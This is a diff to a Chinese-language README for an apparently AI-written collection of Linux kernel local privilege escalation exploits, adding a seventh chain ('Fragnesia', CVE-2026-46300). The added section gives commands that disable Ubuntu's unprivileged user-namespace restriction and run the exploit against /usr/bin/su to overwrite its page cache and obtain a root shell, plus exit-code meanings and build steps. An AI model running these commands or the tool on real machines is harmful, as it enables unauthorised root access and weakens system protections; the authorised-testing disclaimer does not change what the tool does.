@@ -2,7 +2,7 @@
 
 !此项目由AI编写!
 
-六条 CVE 链的页缓存写原语 / 本地提权 PoC 合集，带一个 GTK3 图形前端和一个 Open vSwitch 独立引擎。
+七条 CVE 链的页缓存写原语 / 本地提权 PoC 合集，带一个 GTK3 图形前端和三个内置引擎。
 
 > **免责声明**
 > 本项目仅用于**自有设备**或**已获得书面授权的渗透测试**。
@@ -15,7 +15,7 @@
 
 | 文件 | 说明 |
 |---|---|
-| `dirtyfrag-gui.c` | **单文件主程序**：GTK3 前端 + 内置 OVS 引擎（原 `ovswrap.c` 已并入） |
+| `dirtyfrag-gui.c` | **单文件主程序**：GTK3 前端 + 内置 Fragnesia 引擎 + 内置 OVS 引擎（原 `ovswrap.c` 已并入） |
 | `dirtyfrag_lpe.c` | 五链引擎实现，也可单独编成命令行 `poc` |
 
 
@@ -29,6 +29,24 @@
 | CVE-2026-43494 | io_uring + RDS | 页引用计数劫持 |
 | CVE-2026-46331 | net/sched act_pedit | skb 越界写 |
 | CVE-2026-64531 | net/openvswitch | CT action 越界 → 伪造 SET action → 任意读 + `dst_release` 递减写 |
+| CVE-2026-46300 | XFRM / espintcp | ESP 分片被 TCP coalesce 后当普通数据 splice 回页缓存，改只读文件（Fragnesia） |
+
+### CVE-2026-46300（Fragnesia）
+
+第三个内置引擎，代码取自上游 PoC（V12 · William Bowling），入口 `--frag`。
+
+```bash
+# Ubuntu 默认禁止非特权 userns，不关这个开关会直接卡在 gate 上（退出码 4）
+sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
+
+./dirtychains --frag -check -t /usr/bin/su    # 只探测前置条件，不改写任何文件
+./dirtychains --frag -test  -t /usr/bin/su    # 改写页缓存后回读校验，不 exec 目标
+./dirtychains --frag -start -t /usr/bin/su    # 成功后 exec 目标 → root shell
+```
+
+退出码和另外六条链**相反**：`1` = 有漏洞（字节被改写）、`0` = 没打成、
+`2` = 参数或目标文件不合法、`4` = userns / XFRM 前置条件不满足。
+GUI 里按这个映射显示结论，不要按「0 就是成功」去读。
 
 ---
 
@@ -38,7 +56,7 @@
 # 依赖：gtk+-3.0 开发包
 sudo apt install build-essential libgtk-3-dev pkg-config
 
-make                 # GUI 单二进制 dirtychains（前端 + 五链引擎 + 内置 OVS 引擎）
+make                 # GUI 单二进制 dirtychains（前端 + 五链引擎 + Fragnesia + 内置 OVS 引擎）
 make poc             # 独立的命令行引擎
 make ovswrap         # 独立的 OVS 命令行版（不含 GTK）
 sudo make install    # 装到 /usr/local/bin，背景图与 offset/ 进 share/dirtychains
